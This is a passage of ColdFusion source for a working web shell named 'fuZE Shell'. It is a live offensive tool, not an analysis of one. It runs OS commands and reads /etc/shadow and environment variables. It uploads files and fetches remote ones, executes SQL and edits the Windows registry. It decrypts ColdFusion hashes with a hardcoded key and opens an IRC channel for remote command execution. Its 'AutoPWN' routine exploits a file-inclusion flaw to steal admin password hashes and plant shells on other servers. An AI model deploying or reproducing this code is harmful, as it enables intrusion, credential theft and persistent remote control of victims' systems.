<cfset Xmlbasepath="C:\WINDOWS\system32\inetsrv\MetaBase.xml">
<cftry>
<cffile action="read" file="#Xmlbasepath#" variable="XMLFileText">
<cfcatch type="any">
<cfoutput>Error reading MetaBase.xml: #cfcatch.type#</cfoutput>
<cfreturn xmlpath>
</cfcatch></cftry>
<cfset myXMLDocument=XmlParse(XMLFileText)>
<cfset numItems = ArrayLen(myXMLDocument.configuration.MBProperty.IIsWebServer)>
<cfloop index="i" from = "1" to = #numItems#>
<cfif findnocase("ServerBindings=",#myXMLDocument.configuration.MBProperty.IIsWebServer[i]#)>
<cfset ServerBindings = #myXMLDocument.configuration.MBProperty.IIsWebServer[i].XmlAttributes.ServerBindings#>
<cfset location = #myXMLDocument.configuration.MBProperty.IIsWebServer[i].XmlAttributes.location#>
<cfset arrayAppend(xmllocation,("#location#"))>
<cfset arrayAppend(xmlServerindings,("#ServerBindings#"))>
<cfif findnocase("LogFileDirectory=",#myXMLDocument.configuration.MBProperty.IIsWebServer[i]#)>
<cfset LogFileDirectory = #myXMLDocument.configuration.MBProperty.IIsWebServer[i].XmlAttributes.LogFileDirectory#>
<cfset arrayAppend(xmlLogFileDirectory,("#LogFileDirectory#"))>
<cfelse>
<cfset arrayAppend(xmlLogFileDirectory,(""))>
</cfif></cfif></cfloop>
<cfset numLocations=arraylen(xmllocation)>
<cfset numItems = ArrayLen(myXMLDocument.configuration.MBProperty.IIsWebVirtualDir)>
<cfloop index="i" from = "1" to = #numItems#>
<cfif findnocase("path",#myXMLDocument.configuration.MBProperty.IIsWebVirtualDir[i]#) >
<cfset path1 = #myXMLDocument.configuration.MBProperty.IIsWebVirtualDir[i].XmlAttributes.path#>
<cfif findnocase("Program Files",#path1#) is 0 and findnocase("WINDOWS",#path1#) is 0>
<cfset listpath=arraytolist(xmlpath)>
<cfif find(#path1#,#listpath#) is 0>
<cfset arrayAppend(xmlpath,"#path1#")>
<cfloop index="j" from = "1" to = #numLocations#>
<cfif findnocase(#xmllocation[j]#,#myXMLDocument.configuration.MBProperty.IIsWebVirtualDir[i].XmlAttributes.Location#) is not 0>
<cfoutput>"#path1#" : "#xmlServerindings[j]#" : "#xmlLogFileDirectory[j]#"#chr(10)#</cfoutput>
</cfif></cfloop></cfif></cfif></cfif></cfloop>
<cfcatch>Error
</cfcatch>
</cftry>
</cfcase>
<cfcase value="View open sessions [W]"><cfexecute name="cmd.exe" arguments="/c query session" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View local shares"><cfexecute name="cmd.exe" arguments="/c net share" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View domain shares"><cfexecute name="cmd.exe" arguments="/c net view" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View users"><cfexecute name="cmd.exe" arguments="/c net user" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View running processes [W]"><cfexecute name="cmd.exe" arguments="/c tasklist" timeout="15" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View system info [W]"><cfexecute name="cmd.exe" arguments="/c systeminfo" timeout="30" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Check disk for consistency"><cfexecute name="cmd.exe" arguments="/c chkdsk" timeout="180" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase> <!--- Shout outs to fractal! --->
<!--- Linux functions --->
<cfcase value="Find SUID files"><cfexecute name="sh" arguments="-c 'find / -type f -perm -04000 -ls'" timeout="60" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Find SGID files"><cfexecute name="sh" arguments="-c 'find / -type f -perm -02000 -ls'" timeout="60" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Find all *conf* files"><cfexecute name="sh" arguments="-c 'find / -type f -name *conf*'" timeout="60" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Find all .*_history files"><cfexecute name="sh" arguments="-c 'find / -type f -name .*_history'" timeout="60" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Find all *.pwd files"><cfexecute name="sh" arguments="-c 'find / -type f -name *.pwd'" timeout="60" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Find all .*rc files"><cfexecute name="sh" arguments="-c 'find / -type f -name .*rc'" timeout="60" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Find all writable directories and files"><cfexecute name="sh" arguments="-c 'find / -perm -2 -ls'" timeout="60" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Find all writable directories and files in current dir"><cfexecute name="sh" arguments="-c 'find . -perm -2 -ls'" timeout="60" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Read /etc/passwd"><cfexecute name="sh" arguments="-c 'cat /etc/passwd'" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Read /etc/shadow"><cfexecute name="sh" arguments="-c 'cat /etc/shadow'" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Read /proc/self/environ"><cfexecute name="sh" arguments="-c 'cat /proc/self/environ'" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="Show opened ports [L]"><cfexecute name="sh" arguments="-c 'netstat -a'" timeout="15" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View open sessions [L]"><cfexecute name="sh" arguments="-c 'w'" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View recent sessions"><cfexecute name="sh" arguments="-c 'last'" timeout="15" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View running processes [L]"><cfexecute name="sh" arguments="-c 'ps auxww'" timeout="15" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View memory info"><cfexecute name="sh" arguments="-c 'df -h;free -m'" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View CPU info"><cfexecute name="sh" arguments="-c 'cat /proc/cpuinfo'" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfcase value="View system info [L]"><cfexecute name="sh" arguments="-c 'uname -a'" timeout="10" variable="cmdout"></cfexecute>#htmleditformat(cmdout)#</cfcase>
<cfdefaultcase>Invalid function</cfdefaultcase>
</cfswitch>
<cfcatch>Error
</cfcatch>
</cftry>
</textarea>
<cfelseif isDefined("Form.decrypt_hash")>
<pre>Decrypting '#htmleditformat(Form.decrypt_hash)#'</pre>
<textarea class="report" rows="20">
<cftry>
<cfscript>
dp=Decrypt(Form.decrypt_hash, generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede", "Base64");
writeoutput(dp);
</cfscript>
<cfcatch>Invalid hash
</cfcatch>
</cftry>
</textarea>
<cfelseif isDefined("Form.Upload") and Form.Upload EQ "Upload">
<pre>Uploading file to '#htmleditformat(getDirectoryFromPath(getCurrentTemplatePath()))#'</pre>
<textarea class="report" rows="20">
<cftry>
<cffile action="upload" destination="#getDirectoryFromPath(getCurrentTemplatePath())#" filefield="Form.File" nameconflict="overwrite">File uploaded!
<cfcatch>Upload failed
</cfcatch>
</cftry>
</textarea>
<cfelseif isdefined("Form.Download")>
<cftry>
<cfsilent>
<cfheader name="Content-Disposition" value="attachment; filename=#getFileFromPath(Form.Download)#">
<cfcontent type="application/unknown" file="#Form.Download#">
</cfsilent>
<cfcatch>File is not available
<cfabort>
</cfcatch>
</cftry>
<cfelseif isDefined("Form.RUpload")>
<pre>Uploading file from '#htmleditformat(Form.RUpload)#'</pre>
<textarea class="report" rows="20">
<cftry>
<cfhttp url="#Form.RUpload#" method="get" getasbinary="yes" result="rFile" />
<cffile action="write" file="#getDirectoryFromPath(getCurrentTemplatePath())##listLast(Form.RUpload,"\/")#" addNewLine="no" output="#rFile.filecontent#" />
<cfoutput>File saved to #htmleditformat(getDirectoryFromPath(getCurrentTemplatePath()))##htmleditformat(listLast(Form.RUpload,"\/"))#</cfoutput>
<cfcatch>Error</cfcatch>
</cftry>
</textarea>
<cfelseif isDefined("Form.exec_sql")>
<pre><cfoutput>Executing '#htmleditformat(Form.exec_sql)#' in datasource '#htmleditformat(Form.datasource)#'</cfoutput></pre>
<cfquery name="sqlout" datasource="#Form.datasource#" username="#Form.db_username#" password="#Form.db_password#">
#Form.exec_sql#
</cfquery>
<cfdump var="#sqlout#" expand="false">
<cfelseif isDefined("Form.cfscan")>
<pre>Scanning for CF instances over the LAN</pre>
<textarea class="report" rows="20">
<cftry>
<cfset sf = CreateObject("java", "coldfusion.server.ServiceFactory")>
<cfset lic=#sf.LicenseService.runScan()#>
<cfloop collection="#lic#" item="i">
<cfoutput>ColdFusion #lic[i][1]['Edition']# build #lic[i][1]['Build']# at #lic[i][1]['MachineName']# (#lic[i][1]['IpAddrs']#)#chr(10)#</cfoutput>
</cfloop>
<cfcatch>Error<cfif isDefined("cfcatch.message")>: <cfoutput>#cfcatch.message#</cfoutput></cfif></cfcatch>
</cftry>
</textarea>
<cfelseif isDefined("Form.regpath")>
<cftry>
<cfif form.regpath is not "">
<cfif form.entry is "">
<CFREGISTRY Action="getAll"
Branch="#form.regpath#"
Type="Any"
Name="RegQuery">
<CFTABLE Query="RegQuery" colHeaders HTMLTable Border="Yes">
<CFCOL Header="<B>Entry</b>" Width="35" Text="#RegQuery.Entry#">
<CFCOL Header="<B>Type</b>"  Width="10" Text="#RegQuery.type#">
<CFCOL Header="<B>Value</b>" Width="35" Text="#RegQuery.Value#">
</CFTABLE>
<cfelse>
<cfif form.newentry is "">
<CFPARAM NAME="RegValue" DEFAULT="not found">
<CFREGISTRY Action = "get"  Branch = "#form.regpath#" Entry = "#form.Entry#"  Type="#form.regtype#" variable = "RegValue">
<cfoutput>(#form.regpath#\#form.Entry# )  values is : #RegValue#</cfoutput>
<cfelse>
<CFPARAM NAME="RegValue" DEFAULT="not found">
<CFREGISTRY Action = "get"  Branch = "#form.regpath#" Entry = "#form.Entry#" Variable = "RegValue" Type = "#form.regtype#">
<cfoutput>(#form.regpath#\#form.Entry# )  old  values is : #RegValue#<br /></cfoutput>
<cfif regvalue is not "not found">
<CFREGISTRY Action="set" Branch="#form.regpath#"  Entry="#form.Entry#" Type="#form.regtype#" Value="#form.newEntry#">
<cfoutput>(#form.regpath#\#form.Entry# )  new  values is : #form.newEntry#</cfoutput>
</cfif>
</cfif>
</cfif>
<cfelse>Error: A registry path must be defined
</cfif>
<cfcatch type="any"><cfoutput>Error: #cfcatch.type#</cfoutput></cfcatch>
</cftry>
<cfelseif isDefined("Form.target_host")>
<pre>Attempting to AutoPWN [#htmleditformat(Form.target_host)#]</pre>
<cftry>
<cfset target_host=Form.target_host>
<textarea class="report" rows="20">
====================================================================================================
[~] AutoPWN report for [<cfoutput>#HTMLEditFormat(target_host)#</cfoutput>] 
<cfset lfi=[
<!--- Single server configuration ColdFusion --->
"..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties",
<!--- ColdFusion 7 --->
"..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties",
<!--- ColdFusion 8 --->
"..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties",
<!--- ColdFusion 6, 7 AND 8 --->
"..\..\..\..\..\..\..\..\..\..\JRUN4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties"
]>
<cfset lfi_success=FALSE>
<cfloop array="#lfi#" index="i">
<cfhttp url="http://#target_host#/CFIDE/administrator/logging/settings.cfm?locale=#i#%00en" result="lfiresult" method="get"></cfhttp>
<cfset cfadmin_hash=REReplace(REReplace(REReplace(lfiresult.Filecontent,"(.*?)password=","","ALL"),"#chr(10)#encrypted(.*?)</html>","","ALL"),"\s","","ALL")>
<cfif Len(cfadmin_hash) GT 0 AND Len(cfadmin_hash) LTE 40 AND cfadmin_hash NEQ "ConnectionFailure">
<cfset lfi_success=TRUE>
<cfbreak>
</cfif>
</cfloop>
<cfif lfi_success EQ TRUE>[!] LFI succeeded, hash acquired: <cfoutput>#HTMLEditFormat(cfadmin_hash)#</cfoutput> 
<cfelse><cfthrow message="LFI failed">
</cfif>
<cfhttp url="http://#target_host#/CFIDE/administrator/enter.cfm" result="adminpage" method="get">
<cfset cfadmin_salt=REReplace(Mid(adminpage.Filecontent,13,REFind("[0-9]{13}",adminpage.Filecontent)), "(.*?)salt"" type=""hidden"" value=""","","ALL")>
<cfswitch expression="#Len(cfadmin_hash)#">
<cfcase value="40">
<cfset secretKeySpec=createObject("java","javax.crypto.spec.SecretKeySpec").init(toBinary(toBase64(cfadmin_salt)),"HmacSHA1")>
<cfset mac=createObject("java","javax.crypto.Mac").getInstance("HmacSHA1")>
<cfset mac.init(secretKeySpec)>
<cfset encryptedBytes=mac.doFinal(toBinary(toBase64(cfadmin_hash)))>
<cfset cfadmin_password=BinaryEncode(mac.doFinal(toBinary(toBase64(cfadmin_hash))),"Hex")>
</cfcase>
<cfdefaultcase>
<!--- TODO: CF6 Auth --->
<cfthrow message="CF6 authentication is unsupported">
</cfdefaultcase>
</cfswitch>
[*] Logging in 
<cfset responsecookies=adminpage.Responseheader["Set-Cookie"]>
<cfset cookiearray=ArrayNew(1)>
<cfloop item="i" collection="#responsecookies#">
<cfset cookiearray[i]=ListGetAt(responsecookies[i],1,";")>
</cfloop>
<cfhttp url="http://#target_host#/CFIDE/administrator/enter.cfm" result="adminlogin" method="post" redirect="false">
<cfhttpparam type="header" name="Cookie" value="#ArraytoList(cookiearray,'; ')#">
<cfhttpparam type="formfield" name="cfadminUserId" value="admin">
<cfhttpparam type="formfield" name="cfadminPassword" value="#cfadmin_password#">
<cfhttpparam type="formfield" name="salt" value="#cfadmin_salt#">
</cfhttp>
<cfset authorizationcookies=adminlogin.Responseheader["Set-Cookie"]>
<cfset admincookiearray=ArrayNew(1)>
<cfloop item="i" collection="#authorizationcookies#">
<cfset admincookiearray[i]=ListGetAt(authorizationcookies[i],1,";")>
</cfloop>
<cfset authkey=admincookiearray[4]>
<cfhttp url="http://#target_host#/CFIDE/administrator/reports/index.cfm" result="settingssummary" method="get">
<cfhttpparam type="header" name="Cookie" value="#authkey#">
</cfhttp>
<cfset runtime_user=REReplace(REReplace(REReplace(settingssummary.Filecontent,"(.*?)User Name(.*?)#chr(9)##chr(9)##chr(9)##chr(9)#","","ONE")," &nbsp;(.*?)</html>","","ONE"),"\s","","ALL")>
<cfset cfide_path=REReplace(REReplace(REReplace(settingssummary.Filecontent,"(.*?)#chr(9)#/CFIDE (.*?)#chr(9)##chr(9)##chr(9)##chr(9)#","","ONE")," &nbsp;(.*?)</html>","","ONE"),"\s","","ALL")>
<cfif REFind("/",cfide_path)><cfset slash="/">
<cfelse><cfset slash="\">
</cfif>[*] Creating payload objects 
<cfset shell_name=listFirst(listLast(getCurrentTemplatePath(),"\/"),".")>
<cffile action="Copy" source="#getCurrentTemplatePath()#" destination="#getDirectoryFromPath(getCurrentTemplatePath())##shell_name#.txt">
<cfset shell_url="http://#cgi.local_addr##reverse(listRest(reverse(CGI.SCRIPT_NAME),"/"))#/#shell_name#.txt">
<cfhttp url="http://#target_host#/CFIDE/administrator/scheduler/scheduleedit.cfm" result="scheduletask" method="post">
<cfhttpparam type="header" name="Cookie" value="#authkey#">
<cfhttpparam type="formfield" name="TaskName" value="CFSh">
<cfhttpparam type="formfield" name="Start_Date" value="1/3/37">
<cfhttpparam type="formfield" name="ScheduleType" value="Once">
<cfhttpparam type="formfield" name="StartTimeOnce" value="12:00 AM">
<cfhttpparam type="formfield" name="Interval" value="Daily">
<cfhttpparam type="formfield" name="customInterval_hour" value="0">
<cfhttpparam type="formfield" name="customInterval_min" value="0">
<cfhttpparam type="formfield" name="customInterval_sec" value="0">
<cfhttpparam type="formfield" name="Operation" value="HTTPRequest">
<cfhttpparam type="formfield" name="ScheduledURL" value="#shell_url#">
<cfhttpparam type="formfield" name="publish" value="1">
<cfhttpparam type="formfield" name="publish_file" value="#cfide_path##slash##shell_name#.cfm">
<cfhttpparam type="formfield" name="adminsubmit" value="Submit">
<cfhttpparam type="formfield" name="taskNameOrig" value=""> <!--- CF8- --->
</cfhttp>
<cfhttp url="http://#target_host#/CFIDE/#shell_name#.cfm" result="shell_status" method="get">
<cfif find("&fnof;uZE Shell",shell_status.Filecontent) is not 0>[!] &fnof;uZE copied successfully 
<cfelse>[!] Shell not found, recreating payload to subvert firewall 
<cfhttp url="http://#target_host#/CFIDE/administrator/scheduler/scheduleedit.cfm" result="scheduletask" method="post">
<cfhttpparam type="header" name="Cookie" value="#authkey#">
<cfhttpparam type="formfield" name="TaskName" value="CFSh">
<cfhttpparam type="formfield" name="Start_Date" value="1/3/37">
<cfhttpparam type="formfield" name="ScheduleType" value="Once">
<cfhttpparam type="formfield" name="StartTimeOnce" value="12:00 AM">
<cfhttpparam type="formfield" name="Interval" value="Daily">
<cfhttpparam type="formfield" name="customInterval_hour" value="0">
<cfhttpparam type="formfield" name="customInterval_min" value="0">
<cfhttpparam type="formfield" name="customInterval_sec" value="0">
<cfhttpparam type="formfield" name="Operation" value="HTTPRequest">
<cfhttpparam type="formfield" name="ScheduledURL" value="/CFIDE/probe.cfm?name=%3Cb%3E%26%23181%3BSH%3C%2Fb%3E%22%3C%2Fh1%3E%3Ccfif%20isDefined(%22Form.File%22)%3E%3Ccftry%3E%3Ccffile%20action%3D%22upload%22%20destination%3D%22%23Expandpath(%22.%22)%23%22%20filefield%3D%22Form.File%22%20nameconflict%3D%22overwrite%22%3EFile%20uploaded!%3Ccfcatch%3EUpload%20failed%3C%2Fcfcatch%3E%3C%2Fcftry%3E%3C%2Fcfif%3E%3Cform%20method%3DPOST%20enctype%3D%22multipart%2Fform-data%22%3E%3Cinput%20type%3Dfile%20name%3D%22File%22%3E%3Cinput%20type%3Dsubmit%20value%3D%22Upload%22%3E%3C%2Fform%3E%3Cscript%3E">
<cfhttpparam type="formfield" name="publish" value="1">
<cfhttpparam type="formfield" name="publish_file" value="#cfide_path##slash#microshell.cfm">
<cfhttpparam type="formfield" name="adminsubmit" value="Submit">
<cfhttpparam type="formfield" name="taskNameOrig" value="CFSh"> <!--- CF8- --->
</cfhttp>
<cfhttp url="http://#target_host#/CFIDE/microshell.cfm" result="shell_status_2" method="get">
<cfif find("&##181;SH",shell_status_2.Filecontent) is not 0>[!] Firewall subversion was successful 
<cfelse>[!] Shell not found 
</cfif>
</cfif>[*] Removing payload objects 
<cfhttp url="http://#target_host#/CFIDE/administrator/scheduler/scheduletasks.cfm?action=delete&task=CFSh" result="deletetask" method="get">
<cfhttpparam type="header" name="Cookie" value="#authkey#">
<cffile action="Delete" file="#getDirectoryFromPath(getCurrentTemplatePath())##shell_name#.txt">
</cfhttp>[~] Results: 
[*] Server Status: <cfif find("&fnof;uZE Shell",shell_status.Filecontent) NEQ 0 OR find("&##181;SH",shell_status_2.Filecontent) NEQ 0>Compromised<cfelse>Uncompromised</cfif> 
[*] Access obtained: <cfoutput>#HTMLEditFormat(runtime_user)#</cfoutput> 
[*] Shell location: <cfif find("&fnof;uZE Shell",shell_status.Filecontent) NEQ 0><cfoutput>#HTMLEditFormat("http://#target_host#/CFIDE/#shell_name#.cfm")#</cfoutput><cfelseif find("&##181;SH",shell_status_2.Filecontent) NEQ 0><cfoutput>#HTMLEditFormat("http://#target_host#/CFIDE/microshell.cfm")#</cfoutput><cfelse>N/A</cfif> 
[~] EOF 
====================================================================================================</textarea>
<cfcatch>[!] Error<cfif isDefined("cfcatch.message")>: <cfoutput>#cfcatch.message#</cfoutput></cfif> 
[~] Results: 
[*] Server Status: N/A 
[*] Access obtained: N/A 
[*] Shell location: N/A 
[~] EOF 
====================================================================================================</textarea>
</cfcatch>
</cftry>
<cfelseif isDefined("Form.nuke")>
<pre>Nuking shell</pre>
<textarea class="report" rows="20">
<cftry>
<cffile action="delete" file="#getCurrentTemplatePath()#">
Shell nuked
<cfcatch>Error</cfcatch>
</cftry>
</textarea>
<cfelseif isDefined("Form.ircip") and isDefined("Form.ircport")>
<pre>Connecting to #htmleditformat(Form.ircip)#:#htmleditformat(Form.ircport)#</pre>
<textarea class="report" rows="20">
<cftry>
<cfscript>
try{

// Create socket
socket=createObject("java","java.net.Socket");

// Connect to remote host
socket.connect(createObject("java","java.net.InetSocketAddress").init(Form.ircip,Form.ircport));
writeoutput("Remote port reached: #socket.isConnected()##chr(10)#");

// Establish connection
try{
instream=createObject("java","java.io.BufferedReader").init(createObject("java","java.io.InputStreamReader").init(socket.getInputStream()));
outstream=createObject("java","java.io.PrintWriter").init(socket.getOutputStream());
writeoutput("Connection successful!#chr(10)#");
} catch (IOException e) {
writeoutput("IO Exception: Read failed#chr(10)#");
}

// Communicate
outstream.println("NICK #Form.ircnick#");
outstream.println("USER #Form.ircuname# 8 * :#Form.ircrname#");
outstream.flush();
while(True){
str = instream.readLine();
cmd = str.split(" ");

//---------------------CLIENT----------------------//
if (not cmd[1] EQ "PING"){
if (cmd[2] EQ "433"){
writeoutput("Nickname already in use: #Form.ircnick##chr(10)#");
Form.ircnick="#Form.ircnick#_";
outstream.println("NICK #Form.ircnick#");
outstream.flush();
}
else if (cmd[2] EQ "004"){
writeoutput("Entered IRC#chr(10)#");
outstream.println("JOIN #Form.ircchan#");
outstream.flush();
}
else if (FindNoCase(":>",str)){
command_init=str.split(":>");
command=command_init[2].split(" ");
switch(command[1]){
//---------------------//
// Commands
//---------------------//
// Raw
case "raw":
{
raw_init=str.split(":>raw ");
raw=raw_init[2];
outstream.println("#raw#");
outstream.flush();
break;
}
//---------------------//
// Decrypt
case "decrypt":
{
decrypt_init=str.split(":>decrypt ");
decrypt_hash=decrypt_init[2];
channel=cmd[3];
outstream.println("PRIVMSG #channel# :Decrypting '#chr(15)##decrypt_hash##chr(15)#'");
outstream.flush();
dp=Decrypt(decrypt_hash, generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede", "Base64");
dp=replace(dp,chr(2),"\x02","ALL"); // Escape IRC bold character
dp=replace(dp,chr(3),"\x03","ALL"); // Escape IRC color character
dp=replace(dp,chr(7),"\x07","ALL"); // Escape IRC beep character
dp=replace(dp,chr(10),"\x0A","ALL"); // Escape LF
dp=replace(dp,chr(13),"\x0D","ALL"); // Escape CR
dp=replace(dp,chr(15),"\x0f","ALL"); // Escape IRC no format character
dp=replace(dp,chr(16),"\x16","ALL"); // Escape IRC reverse character
dp=replace(dp,chr(31),"\x1f","ALL"); // Escape IRC underline character
outstream.println("PRIVMSG #channel# :'#dp#'");
outstream.flush();
break;
}
//---------------------//
// Execute
case "exec":
{
exec_init=str.split(":>exec ");
exec=exec_init[2].split(" ");
channel=cmd[3];
outstream.println("PRIVMSG #channel# :Executing '#chr(15)##exec_init[2]##chr(15)#'");
outstream.flush();
p = createObject("java","java.lang.ProcessBuilder").init(exec).start();
i = createObject("java","java.io.InputStreamReader").init(p.getInputStream());
br = createObject("java","java.io.BufferedReader").init(i);
line=br.readLine();
while (isDefined("line")) {
outstream.println("PRIVMSG #channel# :> #line#");
outstream.flush();
line = br.readLine();
}
br.close();
i.close();
break;
}
//---------------------//
// Help
case "help":
{
channel=cmd[3];
outstream.println("PRIVMSG #channel# :fuZE CF IRC Datapipe | Developed by XiX");
outstream.println("PRIVMSG #channel# :Commands: >raw >decrypt >exec >help >exit");
outstream.flush();
break;
}
//---------------------//
// Exit
case "exit":
{
outstream.close();
instream.close();
socket.close();
break;
}
//---------------------//
// Invalid command
default:
{
break;
}
//---------------------//
}
}
}
else {
outstream.println("PONG #str.substring(5)#");
outstream.flush();
}
//--------------------------------------------------//

}

}catch (Exception e) {
writeoutput("Exception: Error#chr(10)#");
}
</cfscript>
<cfcatch>Connection terminated</cfcatch>
</cftry>
</textarea>
<cfelse>
<pre>Waiting for input</pre>
<textarea class="report" rows="20">Welcome to &fnof;uZE Shell</textarea>
</cfif>
</cfoutput></td><td width="25%">
<div class="container">
    <div class="menu">
        <div id='nav'><a href="#execute" name="modal">:: Execute command on server ::</a></div>
        <div id='nav'><a href="#reverse" name="modal">:: Reverse shell ::</a></div>
        <div id='nav'><a href="#functions" name="modal">:: Functions ::</a></div>
        <div id='nav'><a href="#updown" name="modal">:: Upload/download files on server ::</a></div>
        <div id='nav'><a href="#runsql" name="modal">:: Run SQL query ::</a></div>
        <div id='nav'><a href="#registry" name="modal">:: Registry ::</a></div>
        <div id='nav'><a href="#edit" name="modal">:: Edit file ::</a></div>
        <div id='nav'><a href="#bind" name="modal">:: Bindshell ::</a></div>
        <div id='nav'><a href="#decrypt" name="modal">:: CF hash decrypter ::</a></div>
        <div id='nav'><a href="#upremote" name="modal">:: Upload files from remote server ::</a></div>
        <div id='nav'><a href="#scanlan" name="modal">:: Scan LAN for CF ::</a></div>
        <div id='nav'><a href="#autopwn" name="modal">:: AutoPWN remote CF ::</a></div>
        <div id='nav'><a href="#irc" name="modal">:: IRC datapipe ::</a></div>
        <div id='nav'><a href="#nuke" name="modal">:: Nuke shell ::</a></div>
    </div>
</div>
</td></tr>
</table>
<div>
    <cfset tickEnd = GetTickCount()>
    <cfset loopTime = tickEnd - tickBegin>
    <center><pre>XiX<blink>_</blink> | &fnof;uZE | <cfoutput>#loopTime#ms</cfoutput></pre></center>
    </cfif>
</div>
<cfif IsUserLoggedIn() eq "No">
    <cfform name="LoginForm" method="post" format="html">
        <center>
        <table border="1" cellpadding="5" cellspacing="0">
            <tr>
                <td colspan="2" align="center">
                    <img src="<cfoutput>#icon#</cfoutput>">
                </td>
            </tr>
            <tr valign="top">
                <td>UserName</td>
                <td>
                    <cfinput name="UserName" type="text" id="_color" style="background-color:666666; color:White; width:250px; height:25px;">
                </td>
            </tr>
            <tr valign="top">
                <td>Password</td>
                <td>
                    <cfinput name="Password" type="password" style="background-color:666666; color:White; width:250px; height:25px;">
                </td>
            </tr>
            <tr valign="top">
                <td colspan="2" align="right">
                    <cfinput class="_btn" type="submit" name="LoginButton" value="Login">
                </td>
            </tr>
        </table>
        </center>
    </cfform>
</cfif>

</body>

</html>
